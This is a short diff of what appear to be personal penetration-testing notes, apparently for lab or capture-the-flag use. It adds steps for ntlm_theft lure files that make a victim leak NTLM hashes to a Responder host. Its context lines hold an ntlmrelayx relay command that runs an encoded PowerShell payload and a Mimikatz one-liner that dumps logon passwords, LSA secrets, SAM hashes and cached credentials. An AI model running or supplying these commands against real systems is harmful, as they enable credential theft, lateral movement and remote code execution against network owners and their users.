@@ -216,6 +216,18 @@ For the relay do this instead of responder:
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 
 
+Another trick to get hashes on responder is to use ntlm-theft to generate things for a user to click:
+https://github.com/Greenwolf/ntlm_theft
+ - python ntlm_theft.py -g all -s 10.10.14.6 -f 0xdf
+ - run responder and upload these files to a folder on victim machine and wait a couple of minutes
+
+
+
+
+
+
+
+
 Mimikatz One-Liner:
 
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
